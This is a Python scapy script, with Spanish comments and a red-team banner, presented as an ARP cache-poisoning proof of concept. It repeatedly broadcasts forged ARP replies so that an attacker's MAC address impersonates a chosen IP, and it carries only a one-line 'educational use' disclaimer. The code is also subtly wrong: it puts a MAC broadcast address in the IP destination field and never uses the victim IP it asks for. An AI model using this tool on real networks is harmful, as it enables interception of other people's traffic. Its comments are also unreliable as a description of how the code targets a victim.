from scapy.all import ARP, send, get_if_hwaddr
import time
import sys

# ==========================================
# IDENTIDAD VISUAL VAMPSECURE (RED TEAM)
# ==========================================
BANNER = r"""
  __     __                      _____                            
  \ \   / /                     / ____|                           
   \ \_/ /__ _ _ __ ___  _ __ | (___   ___  ___ _   _ _ __ ___  
    \   / _` | '_ ` _ \| '_ \ \___ \ / _ \/ __| | | | '__/ _ \ 
     | | (_| | | | | | | |_) |____) |  __/ (__| |_| | | |  __/ 
     |_|\__,_|_| |_| |_| .__/|_____/ \___|\___|\__,_|_|  \___| 
                       | |         [ARP-ATTACKER v1.0]
                       |_|         PoC: Cache Poisoning
"""

def exploit_arp(target_ip, fake_ip, interface):
    # Obtenemos nuestra propia MAC para la suplantación
    my_mac = get_if_hwaddr(interface)
    
    print(f"[*] Iniciando ataque contra: {target_ip}")
    print(f"[*] Suplantando IP: {fake_ip} con MAC: {my_mac}")
    
    # Construimos el paquete ARP malicioso
    # op=2 significa 'is-at' (respuesta)
    # psrc es la IP que queremos robar (el "disfraz")
    # pdst es a quién queremos engañar (si ponemos 'ff:ff:ff:ff:ff:ff' es a todos)
    packet = ARP(op=2, pdst="ff:ff:ff:ff:ff:ff", psrc=fake_ip, hwsrc=my_mac)

    try:
        while True:
            send(packet, verbose=False)
            print(f"[-] Paquete 'is-at' enviado: {fake_ip} está en {my_mac}", end="\r")
            time.sleep(2) # Inundación controlada
    except KeyboardInterrupt:
        print("\n[*] Ataque finalizado.")

if __name__ == "__main__":
    print(BANNER)
    import argparse
    parser = argparse.ArgumentParser(description="ARP-Attacker PoC — solo para uso educativo en entornos controlados")
    parser.add_argument("target_ip", help="IP de la víctima")
    parser.add_argument("fake_ip",   help="IP a suplantar (disfraz)")
    parser.add_argument("-i", "--iface", default="eth0", help="Interfaz de red (default: eth0)")
    args = parser.parse_args()
    exploit_arp(args.target_ip, args.fake_ip, args.iface)
